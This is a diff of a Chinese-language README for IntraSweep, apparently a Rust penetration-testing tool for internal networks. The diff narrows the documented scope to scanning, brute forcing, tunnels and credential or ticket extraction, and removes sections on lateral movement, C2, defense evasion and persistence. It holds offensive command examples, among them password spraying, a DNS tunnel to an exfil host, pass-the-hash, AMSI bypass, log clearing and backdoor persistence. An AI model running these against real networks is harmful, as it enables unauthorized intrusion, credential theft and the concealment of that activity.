@@ -5,17 +5,17 @@
 [![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey.svg)]()
 [![Release](https://img.shields.io/badge/release-v0.5.0-green.svg)]()
 
-> 高性能 · 全链路 · 内网渗透测试工具
+> 高性能 · 内网渗透侦察与打击工具
 
 ---
 
 ## 介绍
 
-**IntraSweep** 是一个基于 Rust 开发的高性能内网渗透测试工具，覆盖完整攻击链（Cyber Kill Chain）的全部六个阶段。专为红队高效渗透设计，提供从初始侦察到最终报告生成的一站式能力。
+**IntraSweep** 是一个基于 Rust 开发的高性能内网渗透测试工具，聚焦内网侦察与打击的核心环节：网络扫描、系统信息收集、弱口令爆破、内网穿透隧道、凭据与票据提取。专为红队单兵作业设计，提供从初始侦察到报告生成的一站式能力。
 
 **核心优势**：
-- **全链路覆盖** — 17 个功能模块，覆盖扫描、凭据、横向、提权、持久化、规避、C2、报告全流程
-- **高性能** — 异步 I/O 架构，多级并发控制，Release 构建仅 **6.9 MB** 单二进制
+- **聚焦核心** — 围绕扫描、信息收集、弱口令爆破、SOCKS 隧道、凭据/票据提取五大能力深耕
+- **高性能** — 异步 I/O 架构，自适应批处理与超时，Release 构建仅 **6.9 MB** 单二进制
 - **跨平台** — Windows / Linux / macOS 原生支持
 - **OPSEC 友好** — LTO + strip 最小体积、敏感字符串 XOR 编译期混淆、release panic=abort
 - **模块化** — 插件系统支持动态加载扩展，YAML 配置文件预设参数
@@ -34,11 +34,7 @@
   - [漏洞扫描](#漏洞扫描)
   - [AD 域深度枚举](#ad-域深度枚举)
   - [提权检测](#提权检测)
-  - [横向移动](#横向移动)
-  - [内网穿透与 C2](#内网穿透与-c2)
-  - [攻击路径规划](#攻击路径规划)
-  - [防御规避](#防御规避)
-  - [持久化](#持久化)
+  - [内网穿透](#内网穿透)
   - [报告生成](#报告生成)
 - [项目结构](#项目结构)
 - [命令参考](#命令参考)
@@ -140,16 +136,16 @@ intrasweep scan 192.168.1.0/24 port --format csv -o result.csv
 
 | 扫描类型 | 说明 |
 |---------|------|
-| `port` | 端口扫描（默认 TCP Connect） |
-| `host` | 主机发现（TCP SYN / ICMP / ARP） |
+| `port` | 端口扫描（TCP Connect，自适应批处理 + 超时分级） |
+| `host` | 主机发现（TCP Connect / ARP） |
 | `comprehensive` | 综合扫描（主机发现 + 端口扫描 + 服务探测） |
 
 | 主机发现方法 | 说明 |
 |-------------|------|
-| TCP SYN | 默认，兼容性好 |
-| ICMP | 需要 ICMP 权限 |
+| TCP Connect | 默认，多端口并行探测，跨平台无需特权 |
 | ARP | 仅本地网段，速度快（Windows） |
-| Hybrid | TCP SYN + ICMP 组合 |
+
+> 注：主机发现与端口扫描统一走 TCP Connect。枚举中的 SYN/ICMP/UDP/SCTP 选项保留为兼容入口，实际语义同为 TCP Connect（`--help` 已标注）。
 
 | 扫描预设 | 说明 |
 |---------|------|
@@ -203,8 +199,8 @@ intrasweep crack 192.168.1.1 -s ssh -U users.txt -P passwords.txt
 # 延迟（避免触发防护）
 intrasweep crack 192.168.1.1 -s ssh -u root -P passwords.txt --delay 500
 
-# 密码喷洒（域环境，防账户锁定）
-intrasweep crack 192.168.1.1 -s winrm -U domain_users.txt -P spring2026.txt --spray
+# 密码喷洒（少量密码 × 大量用户，轮间冷却防账户锁定；当前支持 SSH）
+intrasweep crack 192.168.1.1 -s ssh -U domain_users.txt --spray
 ```
 
 | 服务 | 默认端口 | 认证方式 |
@@ -315,26 +311,7 @@ intrasweep privesc -o privesc_result.json
 intrasweep privesc --format csv -o privesc_result.csv
 ```
 
-### 横向移动
-
-```bash
-# PsExec
-intrasweep lateral 10.0.0.5 psexec -c "cmd /c whoami" -u admin -p password
-
-# WMI
-intrasweep lateral 10.0.0.5 wmi -c "cmd /c ipconfig" -u admin -p password
-
-# WinRM
-intrasweep lateral 10.0.0.5 winrm -c "Get-Process" -u admin -p password
-
-# Pass-the-Hash
-intrasweep lateral 10.0.0.5 psexec -c "cmd /c whoami" -u Administrator --nthash <hash>
-
-# Pass-the-Ticket
-intrasweep lateral 10.0.0.5 psexec -c "cmd /c whoami" --ticket-file ticket.kirbi
-```
-
-### 内网穿透与 C2
+### 内网穿透
 
 ```bash
 # 交互式向导（推荐）
@@ -346,7 +323,7 @@ intrasweep tunnel forward -t 192.168.1.100:3389 -L 8080
 # 反向隧道 — 从内网建立连接回外网
 intrasweep tunnel reverse -t 10.0.0.1:8888 -L 8080
 
-# SOCKS5 代理 — 动态端口转发
+# SOCKS5 代理 — 动态端口转发（含目标连接重试，链路抖动自愈）
 intrasweep tunnel socks5 -L 1080
 intrasweep tunnel socks5 -L 1080 --socks5-username user --socks5-password pass
 
@@ -356,68 +333,11 @@ intrasweep tunnel chain -H 10.0.0.1:2222 -H 10.0.0.2:3333 -t 192.168.2.100:80
 # 加密隧道 — XChaCha20-Poly1305 AEAD 加密传输
 intrasweep tunnel forward -t 192.168.1.100:3389 -L 8080 --encryption-key "my-secret"
 
-# 连接多路复用
-intrasweep tunnel forward -t 192.168.1.100:3389 -L 8080 --mux
-
 # HTTP 隧道
 intrasweep tunnel http -t 192.168.1.100:80 -L 8080
 
 # DNS 隧道
 intrasweep tunnel dns -d exfil.example.com --encryption-key "my-secret"
-
-# C2 服务器
-intrasweep tunnel c2 serve --listen 0.0.0.0:4444 --psk "secret-key"
-
-# C2 Agent 连接
-intrasweep tunnel c2 connect --server 10.0.0.1:4444 --psk "secret-key"
-```
-
-### 攻击路径规划
-
-```bash
-# 基于 AD 枚举结果规划攻击路径
-intrasweep attack-path --ad-file ad_result.json --current-host WEB01 --current-user iis_apppool
-
-# 导出 Graphviz DOT 图
-intrasweep attack-path --ad-file ad_result.json --export-dot attack.dot
-
-# 生成 HTML 可视化
-intrasweep attack-path --ad-file ad_result.json --export-html attack.html
-```
-
-### 防御规避
-
-```bash
-# AMSI 绕过
-intrasweep evasion --amsi-bypass
-
-# ETW 补丁
-intrasweep evasion --patch-etw
-
-# 清除事件日志
-intrasweep evasion --clear-logs
-
-# 修改文件时间戳
-intrasweep evasion --timestomp malicious.exe
-
-# 沙箱/虚拟环境检测
-intrasweep evasion --detect-sandbox
-```
-
-### 持久化
-
-```bash
-# 计划任务持久化
-intrasweep persist --method scheduled-task --payload "C:\backdoor.exe" --name "WinUpdate"
-
-# 注册表 Run 键
-intrasweep persist --method registry --payload "C:\backdoor.exe" --name "SecurityHealth"
-
-# Windows 服务
-intrasweep persist --method service --payload "C:\backdoor.exe" --name "WinSvc"
-
-# SSH 密钥（Linux）
-intrasweep persist --method ssh-key --payload "ssh-rsa AAAA..."
 ```
 
 ### 报告生成
@@ -443,8 +363,8 @@ intrasweep report --format full --mitre -o report.md
 ```
 src/
 ├── main.rs             入口（命令路由、配置加载）
-├── lib.rs              库入口（17 个子模块）
-├── cli/                CLI 层（7 个命令处理 + 交互式向导）
+├── lib.rs              库入口
+├── cli/                CLI 层（8 个命令处理 + 交互式向导）
 │   ├── mod.rs          Commands 枚举、InteractiveMenu、全局参数
 │   ├── scan.rs         扫描命令
 │   ├── crack.rs        爆破命令
@@ -457,8 +377,8 @@ src/
 │   ├── mod.rs          统一入口（Scanner、主机发现、端口扫描、综合扫描）
 │   ├── config.rs       ScanConfig + ScanPreset + HostScanMethod + PortScanMethod
 │   ├── models.rs       ScanResult、HostResult、PortInfo、ServiceInfo、WebFingerprint
-│   ├── host.rs         主机发现（TCP SYN/ICMP 多端口并行探测）
-│   ├── port.rs         端口扫描（异步 TCP Connect，自适应批处理，隐身延迟）
+│   ├── host.rs         主机发现（TCP Connect 多端口并行探测）
+│   ├── port.rs         端口扫描（异步 TCP Connect，自适应超时 + 超时分级 + 高并发）
 │   ├── service.rs      ServiceIdentifier 多协议 Banner 抓取与版本解析
 │   ├── domain.rs       DomainScanner 域信息扫描（net/nltest/setspn 命令）
 │   ├── webfinger.rs    Web 指纹扫描（HTTP 响应分析 + favicon MMH3 哈希）
@@ -489,23 +409,6 @@ src/
 │   ├── firewall.rs     防火墙规则收集（netsh advfirewall / iptables）
 │   ├── vlan.rs         VLAN 与网络拓扑发现（子网计算/CIDR/路由表/ARP 扫描）
 │   └── adcs.rs         ADCS 证书服务枚举（CA/模板/ESC1-ESC8 检测）
-├── lateral/            横向移动引擎（9 个子模块）
-│   ├── mod.rs          LateralManager、LateralConfig、LateralCredential
-│   ├── psexec.rs       PsExec（SMB ADMIN$ + sc 服务创建/启动/清理）
-│   ├── wmi.rs          WMI（wmic + PowerShell WMI 远程进程创建）
-│   ├── winrm.rs        WinRM（winrs + PowerShell Remoting）
-│   ├── smb_exec.rs     SMB 执行（schtasks 隐蔽模式）
-│   ├── schtasks.rs     计划任务远程执行
-│   ├── dcom.rs         DCOM（MMC20.Application）
-│   ├── pth.rs          Pass-the-Hash 认证 + NTLM 哈希验证
-│   ├── ptt.rs          Pass-the-Ticket 票据注入 + 导出
-│   └── token.rs        Token 枚举与 SYSTEM 令牌发现
-├── attack_path/        攻击路径规划
-│   └── mod.rs          AttackPathPlanner、AttackGraph、BFS 最短路径、DOT/可读报告导出
-├── persist/            持久化模块
-│   └── mod.rs          PersistenceManager（计划任务/注册表/服务/启动文件夹/Cron/SSH Key）
-├── evasion/            防御规避模块
-│   └── mod.rs          EvasionManager（AMSI/ETW/日志清除/Timestomp/Shellcode 混淆/沙箱检测）
 ├── cracker/            密码爆破
 │   ├── base.rs         并发引擎（Semaphore + AtomicBool 命中即停）
 │   ├── service.rs      CrackService（8 种服务）、CrackConfig、Cracker trait
@@ -513,21 +416,19 @@ src/
 │   ├── ntlm.rs         NTLMv2 认证（Negotiate/Challenge/Authenticate + HMAC-MD5）
 │   ├── spray.rs        Password Spraying（SprayConfig，防账户锁定）
 │   └── ...             各服务爆破实现（SSH/RDP/Redis/PostgreSQL/MySQL/MSSQL/MongoDB/WinRM）
-├── tunnel/             网络穿透与 C2
+├── tunnel/             网络穿透
 │   ├── mod.rs          TunnelManager 工厂
-│   ├── config.rs       TunnelConfig、TunnelType（Forward/Reverse/Socks5/Chain/Http/Dns/C2）
+│   ├── config.rs       TunnelConfig、TunnelType（Forward/Reverse/Socks5/Chain）
 │   ├── models.rs       ConnectionInfo、TunnelStatus、TunnelEvent
 │   ├── crypto.rs       XChaCha20-Poly1305 CryptoLayer + EncryptedStream
-│   ├── mux.rs          连接多路复用（Open/Data/Close/Ping/Pong 帧）
 │   ├── shutdown.rs     CancellationToken 优雅关闭
 │   ├── relay.rs        relay() 泛型双向中继
 │   ├── forward.rs      正向隧道
 │   ├── reverse.rs      反向隧道
-│   ├── socks5.rs       RFC 1928 SOCKS5 代理（支持 RFC 1929 用户密码认证）
+│   ├── socks5.rs       RFC 1928 SOCKS5 代理（RFC 1929 用户密码认证 + 目标连接重试）
 │   ├── chain.rs        多级链式跳板
 │   ├── http.rs         HTTP CONNECT 代理隧道
-│   ├── dns.rs          DNS 隧道（Base32 子域名编码）
-│   └── c2.rs           C2 框架（C2Server/C2Agent、Beacon 能力、Malleable C2、P2P、Team Server）
+│   └── dns.rs          DNS 隧道（Base32 子域名编码）
 ├── vuln/               漏洞扫描
 │   ├── mod.rs          VulnScanner、VulnScanConfig
 │   ├── poc.rs          PoCRule、Severity（5 级）、Transport（HTTP/TCP/Script）、Matcher、Extractor
@@ -552,7 +453,7 @@ src/
 │   ├── system.rs       系统信息
 │   ├── network.rs      网络信息（接口/路由/ARP/连接）
 │   ├── process.rs      进程信息
-│   ├── credential.rs   凭据信息
+│   ├── credential.rs   凭据信息（哈希/SSH密钥/API密钥/环境变量密钥/known_hosts/PuTTY/RDP 历史）
 │   └── file.rs         文件搜索
 ├── core/               核心库
 │   ├── error.rs        结构化错误（14 种变体）
@@ -648,58 +549,6 @@ src/
 **Windows 类别：** `service` `credentials` `registry` `tokens` `files` `patches` `dll`
 
 **Linux 类别：** `suid` `capabilities` `cron` `writable` `docker` `sudo` `ssh` `kernel`
-
-### Lateral
-
-| 参数 | 说明 |
-|------|------|
-| `<target>` | 目标主机（IP/主机名） |
-| `<method>` | 横向方法：`psexec` `wmi` `winrm` `smbexec` `schtasks` `dcom` |
-| `-c, --command` | 要执行的命令 |
-| `-u, --username` | 认证用户名 |
-| `-p, --password` | 认证密码 |
-| `--nthash` | NTLM 哈希（Pass-the-Hash） |
-| `--ticket-file` | Kerberos 票据文件（Pass-the-Ticket） |
-| `-d, --domain` | 域名 |
-| `--service-name` | 服务名（PsExec，默认随机生成） |
-| `-t, --timeout` | 超时秒数（默认 60） |
-
-### Tunnel
-
-| 参数 | 说明 |
-|------|------|
-| `<type>` | 隧道类型：`forward` / `reverse` / `socks5` / `chain` / `http` / `dns` / `c2` |
-| `-t, --target` | 目标地址 `host:port` |
-| `-L, --local-port` | 本地监听端口 |
-| `-R, --remote-port` | 远程监听端口 |
-| `-H, --hop` | 跳板主机（可多次指定） |
-| `--socks5-username` | SOCKS5 认证用户名 |
-| `--socks5-password` | SOCKS5 认证密码 |
-| `--encryption-key` | 加密密钥（启用 XChaCha20-Poly1305 AEAD） |
-| `--mux` | 启用连接多路复用 |
-| `--psk` | C2 预共享密钥 |
-| `-c, --max-connections` | 最大并发连接（默认 100） |
-| `-t, --timeout` | 超时秒数（默认 30） |
-
-### Evasion
-
-| 参数 | 说明 |
-|------|------|
-| `--amsi-bypass` | 绕过 AMSI |
-| `--patch-etw` | 修补 ETW |
-| `--clear-logs` | 清除事件日志 |
-| `--log-type` | 指定日志类型（Security/System/Application） |
-| `--timestomp` | 修改文件时间戳 |
-| `--reference-file` | 参考文件（复制其时间戳） |
-| `--detect-sandbox` | 检测沙箱/虚拟环境 |
-
-### Persist
-
-| 参数 | 说明 |
-|------|------|
-| `--method` | 持久化方法：`scheduled-task` `registry` `service` `startup` `cron` `ssh-key` |
-| `--payload` | Payload 路径 |
-| `--name` | 名称（任务名/服务名/注册表键名） |
 
 ### Report
 
@@ -975,20 +824,19 @@ krbtgt NTLM 哈希 + 域名 + 域 SID → RC4/AES 加密 PAC（含 Domain Admins
 ## 攻击链覆盖
 
 ```
-初始访问     scanner + vuln（端口扫描/服务探测/漏洞利用/Web主动探测）
+侦察发现     scanner（端口扫描/服务探测/Web指纹）+ vuln（漏洞扫描/Web主动探测）
     ↓
-立足点维持   persist（计划任务/注册表/服务/启动文件夹/Cron/SSH）+ C2 Beacon
+信息收集     collector + cred + recon（系统/网络/进程/凭据/环境变量密钥/known_hosts/
+             PuTTY/RDP 历史/浏览器/WiFi/应用/GPP/SAM/LSASS/EDR检测/用户猎杀/
+             文件共享/AD枚举/BloodHound/防火墙/VLAN/ADCS）
     ↓
-信息收集     collector + cred + recon（系统/网络/进程/凭据/浏览器/WiFi/应用/GPP/
-             SAM/LSASS/EDR检测/用户猎杀/文件共享/AD枚举/BloodHound/防火墙/VLAN/ADCS）
+权限提升检测 privesc（Windows 7 类 / Linux 8 类自动检测）
     ↓
-权限提升     privesc（Windows 7 类 / Linux 8 类自动检测）
+弱口令打击   cracker（8 服务并发爆破 + 密码喷洒防账户锁定）
     ↓
-横向移动     lateral（PsExec/WMI/WinRM/SMB/DCOM/PtH/PtT/Token）
+凭据/票据   cred + ad（Kerberoasting / AS-REP / GPP / DCSync / Golden / Silver Ticket）
     ↓
-达成目标     cred（DCSync/Golden Ticket/Silver Ticket/Kerberoasting）
-    ↓
-清理痕迹     evasion（AMSI绕过/ETW补丁/日志清除/Timestomp）
+内网穿透     tunnel（正向/反向/SOCKS5/链式/HTTP/DNS + AEAD 加密 + 目标连接重试）
     ↓
 报告输出     output/report（执行摘要/攻击链叙事/发现清单/MITRE ATT&CK/时间线）
 ```
